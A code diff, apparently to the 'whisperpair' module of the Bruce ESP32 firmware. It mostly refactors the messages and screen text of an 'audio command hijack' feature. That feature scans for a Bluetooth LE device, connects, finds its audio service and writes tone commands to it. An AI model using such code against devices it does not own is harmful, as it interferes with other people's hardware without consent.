@@ -3,7 +3,14 @@
 #include <globals.h>
 #include "core/display.h"
 
-extern int8_t showAdaptiveMessage(const char* line1, const char* btn1 = "", const char* btn2 = "", const char* btn3 = "", uint16_t color = TFT_WHITE, bool showEscHint = true);
+// Forward declarations for functions in whisperpair.cpp
+extern int8_t showAdaptiveMessage(const char* line1, const char* btn1 = "", const char* btn2 = "", const char* btn3 = "", uint16_t color = TFT_WHITE, bool showEscHint = true, bool autoProgress = false);
+extern void showWarningMessage(const char* message);
+extern void showErrorMessage(const char* message);
+extern void showSuccessMessage(const char* message);
+extern bool requireSimpleConfirmation(const char* message);
+extern bool initBLEIfNeeded(const char* deviceName);
+extern String selectTargetFromScan(const char* title);
 
 void AudioCommandService::AudioCmdCallbacks::onWrite(NimBLECharacteristic* pCharacteristic) {
     std::string value = pCharacteristic->getValue();
@@ -66,31 +73,35 @@ bool attemptAudioCommandHijack(NimBLEAddress target) {
     tft.setCursor(20, 60);
     tft.print("Connecting...");
 
-    initBLEIfNeeded();
+    initBLEIfNeeded("Bruce-WP");
 
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient->connect(target)) {
-        showAdaptiveMessage("Failed to connect", "OK", "", "", TFT_WHITE);
+        showErrorMessage("Failed to connect");
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
+    
+    tft.fillRect(20, 80, tftWidth - 40, 60, bruceConfig.bgColor);
     tft.setCursor(20, 80);
-    tft.print("Connected");
+    tft.print("Connected!");
     tft.setCursor(20, 100);
-    tft.print("Discovering...");
+    tft.print("Discovering services...");
 
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID("19B10000-E8F2-537E-4F6C-D104768A1214"));
     if(!pService) pService = pClient->getService(NimBLEUUID((uint16_t)0x1843));
     if(!pService) {
-        showAdaptiveMessage("No audio service", "OK", "", "", TFT_WHITE);
+        showErrorMessage("No audio service found");
         pClient->disconnect();
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
+    
+    tft.fillRect(20, 120, tftWidth - 40, 60, bruceConfig.bgColor);
     tft.setCursor(20, 120);
-    tft.print("Audio service found");
+    tft.print("Audio service found!");
     tft.setCursor(20, 140);
-    tft.print("Sending tones...");
+    tft.print("Sending test tones...");
 
     uint16_t tones[] = {440, 550, 660, 770};
     for(int i = 0; i < 4; i++) {
@@ -104,6 +115,7 @@ bool attemptAudioCommandHijack(NimBLEAddress target) {
         if(pChar) pChar->writeValue(toneCmd, sizeof(toneCmd), false);
         delay(200);
     }
+    
     pClient->disconnect();
     NimBLEDevice::deleteClient(pClient);
     return true;
@@ -113,28 +125,28 @@ void audioCommandHijackTest() {
     tft.fillScreen(bruceConfig.bgColor);
     drawMainBorderWithTitle("AUDIO CMD HIJACK");
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-    
+
     String selectedInfo = selectTargetFromScan("SELECT TARGET");
     if(selectedInfo.isEmpty()) return;
-    
+
     int colonPos = selectedInfo.lastIndexOf(':');
     if(colonPos == -1) {
-        showAdaptiveMessage("Invalid device info", "OK", "", "", TFT_RED);
+        showErrorMessage("Invalid device info");
         return;
     }
-    
+
     String selectedMAC = selectedInfo.substring(0, colonPos);
     uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
-    
+
     NimBLEAddress target(selectedMAC.c_str(), addrType);
-    
+
     if(!requireSimpleConfirmation("Start audio CMD hijack?")) return;
-    
+
     bool success = attemptAudioCommandHijack(target);
-    
+
     if(success) {
-        showAdaptiveMessage("SUCCESS! Audio commands sent", "OK", "", "", TFT_GREEN);
+        showSuccessMessage("SUCCESS! Audio commands sent");
     } else {
-        showAdaptiveMessage("FAILED - No audio service", "OK", "", "", TFT_RED);
+        showErrorMessage("FAILED - No audio service");
     }
 }
